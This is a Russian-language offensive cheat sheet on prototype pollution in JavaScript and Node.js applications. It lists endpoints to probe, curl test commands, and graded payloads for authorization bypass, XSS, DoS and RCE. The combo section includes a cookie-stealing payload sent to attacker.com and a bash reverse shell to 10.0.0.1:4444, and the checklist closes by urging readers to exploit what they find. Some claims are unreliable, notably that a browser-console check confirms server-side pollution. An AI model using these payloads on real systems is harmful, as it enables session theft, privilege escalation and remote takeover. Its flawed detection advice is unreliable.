# Prototype pollution - уязвимость при которой можно внедрить нужное св-во в прототип объекта

## 🔥 **КОГДА ИСПОЛЬЗОВАТЬ PROTOTYPE POLLUTION **

### 1️⃣ **ТЫ МОЖЕШЬ ОТПРАВИТЬ JSON НА СЕРВЕР**
Если в приложении есть любой эндпоинт, который принимает JSON (например, `/api/settings`, `/api/profile`, `/api/preferences`, `/api/config`, `/api/update`) — **проверяй prototype pollution**.

**Признаки:**
- Ты отправляешь `{"key": "value"}` и сервер **сохраняет эти данные** (куда-то записывает).
- Сервер **возвращает** твои данные обратно (в ответе или в другом запросе).
- Есть форма, которая отправляет JSON на сервер.
- Любой эндпоинт с `Content-Type: application/json`.

### 2️⃣ **ТЫ МОЖЕШЬ ИЗМЕНИТЬ СВОЙ ПРОФИЛЬ ИЛИ НАСТРОЙКИ**
Если есть:
- Страница настроек (`/settings`)
- Редактирование профиля (`/profile`)
- Изменение предпочтений (`/preferences`)
- Обновление конфига (`/config`)

**ЭТО ВСЕГДА ПРОВЕРЯЙ НА PROTOTYPE POLLUTION!**

### 3️⃣ **ТЫ ВИДИШЬ, ЧТО ПРИЛОЖЕНИЕ ИСПОЛЬЗУЕТ НЕБЕЗОПАСНЫЕ ФУНКЦИИ

Ты можешь не знать, использует ли сервер `merge()` или `Object.assign()`. Но:

**Если приложение принимает JSON и как-то его обрабатывает, есть шанс, что под капотом происходит объединение объектов.**

Проверка:
```json
{"constructor": {"prototype": {"test": "vulnerable"}}}
```

Затем в консоли браузера:
```javascript
console.log(({}).test); // Если "vulnerable" - уязвимость есть!
```


## 💡 **ПОЧЕМУ ЭТО ВАЖНО (И КАК ЭТО РАБОТАЕТ БЕЗ MERGE):**

Даже если сервер **не использует `merge()`**, он всё равно может быть уязвим, если:

1. Он делает `Object.assign({}, userInput)` для копирования данных.
2. Он сохраняет JSON в базу и потом восстанавливает его через `JSON.parse()`.
3. Он передаёт данные между сервисами, и где-то в цепочке происходит объединение объектов.
4. Он использует фреймворк, который под капотом делает небезопасное копирование (например, `express.json()` + `Object.assign`).



| Место | Что проверять |
|-------|---------------|
| **API эндпоинты** | `/api/settings`, `/api/config`, `/api/preferences`, `/api/profile` |
| **Параметры JSON** | Любые JSON-объекты, которые ты отправляешь на сервер |
| **Query параметры** | `?config={...}` или любые парсеры объектов из URL |
| **Формы** | Поля ввода, которые передаются как объекты |
| **Cookie** | Если кука парсится как объект (например, JWT с JSON) |

### 2️⃣ **КАК БЫСТРО ПРОВЕРИТЬ**

```bash
# Способ 1: Через __proto__
curl -X POST /api/settings -d '{"__proto__": {"test": "vulnerable"}}'

# Способ 2: Через constructor.prototype (чаще работает)
curl -X POST /api/settings -d '{"constructor": {"prototype": {"test": "vulnerable"}}}'

# Проверка в браузере после атаки:
console.log(({}).test)  // Если "vulnerable" - уязвимо!
```

**ЕСЛИ В КОНСОЛИ `({}).test` ВЕРНУЛ `"vulnerable"` - ВЫ НАШЛИ УЯЗВИМОСТЬ 100%!**


## 🔍 **ЧТО ИСКАТЬ В КОДЕ (ПРИ АУДИТЕ):**

### Критические функции (если видишь их - проверяй):
```javascript
// 1. Библиотечные merge-функции
merge(target, source)           // danger!
_.merge(target, source)         // Lodash - danger!
$.extend(target, source)        // jQuery - danger!
Object.assign(target, source)   // danger!

// 2. Клонирование
_.cloneDeep(source)             // danger!
{...source}                     // spread оператор (при определённых условиях)

// 3. Установка свойств по пути
_.set(object, path, value)      // danger!
_.setWith(object, path, value)  // danger!

// 4. Парсеры
qs.parse(queryString)           // danger!
JSON.parse() + merge
```

## 🎯 **КЛЮЧЕВЫЕ КЛЮЧИ (ТОП-3):**

| Ключ | Как работает | Когда использовать |
|------|--------------|-------------------|
| `__proto__` | Прямой доступ к прототипу | Современные Node.js могут блокировать |
| `constructor.prototype` | Обход через конструктор | Работает чаще (как в твоём случае) |
| `prototype` | Если объект - функция | Для классов и конструкторов |


## 🧪 **ТЕСТОВЫЕ PAYLOADS (ОТ ПРОСТЫХ К СЛОЖНЫМ):**

### Уровень 1: Проверка наличия уязвимости
```json
{"__proto__": {"test": "polluted"}}
{"constructor": {"prototype": {"test": "polluted"}}}
{"prototype": {"test": "polluted"}}
```

### Уровень 2: Обход проверок
```json
{"constructor": {"prototype": {"unlock": true}}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"constructor": {"prototype": {"role": "admin"}}}
{"constructor": {"prototype": {"logged_in": true}}}
{"constructor": {"prototype": {"privileged": true}}}
{"constructor": {"prototype": {"config.unlocked": true}}}
```

### Уровень 3: XSS через свойства
```json
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
{"__proto__": {"srcdoc": "<script>alert(1)</script>"}}
{"__proto__": {"onerror": "alert(1)"}}
```

### Уровень 4: DoS атаки
```json
{"__proto__": {"toString": "crash"}}
{"__proto__": {"toLocaleString": "crash"}}
{"__proto__": {"valueOf": "crash"}}
{"__proto__": {"length": 1000000000}}
```

### Уровень 5: RCE (Node.js) - если есть exec
```json
{"__proto__": {"exec": "require('child_process').exec('calc')"}}
{"__proto__": {"NODE_OPTIONS": "--inspect-brk"}}
{"__proto__": {"shell": "bash"}}
{"constructor": {"prototype": {"exec": "require('child_process').exec('whoami > /tmp/pwned')"}}}
```


## 💥 **ЭКСПЛУАТАЦИЯ В КОМБО С ДРУГИМИ УЯЗВИМОСТЯМИ:**

### Комбо с XSS:
```json
{"__proto__": {"innerHTML": "<img src=x onerror='fetch(\"http://attacker.com?c=\"+document.cookie)'>"}}
```

### Комбо с RCE:
```json
{"constructor": {"prototype": {"exec": "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"')"}}}
```

### Комбо с обходом авторизации:
```json
{"constructor": {"prototype": {"config": {"unlocked": true}}}}
{"constructor": {"prototype": {"user": {"role": "admin"}}}}
{"__proto__": {"__proto__": {"isAdmin": true}}}
```


## ✅ **ПРОВЕРКА В КОНСОЛИ БРАУЗЕРА:**

```javascript
// ДО атаки
({}).pp // undefined

// ПОСЛЕ атаки (если уязвимо)
({}).pp // "polluted" или "vulnerable"

// Проверка конкретного свойства
({}).unlock // true (как в твоём случае)
({}).isAdmin // true
({}).role // "admin"

// Проверка через constructor
({}).constructor.prototype.unlock // true
```


## 🛠 **АВТОМАТИЧЕСКИЕ ИНСТРУМЕНТЫ:**

| Инструмент | Для чего |
|------------|----------|
| **NodeJsScan** | Статический анализ Node.js кода |
| **PPFuzz** | Фаззинг для обнаружения prototype pollution |
| **Prototype Pollution Scanner** | Сканер JS кода |
| **BlackFan Client-side** | Поиск на клиентской стороне |
| **Burp Suite Extensions** | Специальные расширения для PP |
| **ESLint plugin** | no-merge, no-prototype-pollution |


## ⚠️ **ГЛАВНОЕ ПРАВИЛО (ЗАПОМНИ):**

**Prototype pollution - самостоятельная уязвимость, которая позволяет:**
1. **Менять поведение ВСЕХ объектов** в приложении
2. **Вызывать DoS** (перегружая методы)
3. **Обходить проверки авторизации** (как в твоём случае)
4. **Поднимать привилегии** (становиться админом)
5. **В комбинации с XSS/RCE** - становится смертельной уязвимостью


## 🎯 **ЧЕК-ЛИСТ ДЛЯ БЫСТРОЙ ПРОВЕРКИ (100% СЛУЧАИ):**

- [ ] Найди любой эндпоинт, принимающий JSON
- [ ] Отправь `{"constructor": {"prototype": {"test": "vulnerable"}}}`
- [ ] Проверь в консоли браузера: `({}).test === "vulnerable"`
- [ ] Если да - найди полезное свойство (`isAdmin`, `unlock`, `role`, `logged_in`)
- [ ] Отправь payload с этим свойством
- [ ] Проверь, изменилось ли поведение приложения
- [ ] Если да - эксплуатируй!

## 💡 **КОРОТКО О ГЛАВНОМ (ДЛЯ СОБЕСЕДОВАНИЯ):**

**Prototype Pollution** - это когда злоумышленник добавляет свойства в глобальный прототип JavaScript (`Object.prototype`). Все объекты в приложении наследуют эти свойства, что позволяет:
- Обходить проверки
- Изменять логику приложения
- Вызывать DoS
- Получать RCE

**Главный признак:** любая функция, которая объединяет пользовательский объект с системным (`merge`, `Object.assign`, `_.extend`).


**Помни:** `constructor.prototype` работает чаще, чем `__proto__` в современных средах. 🚀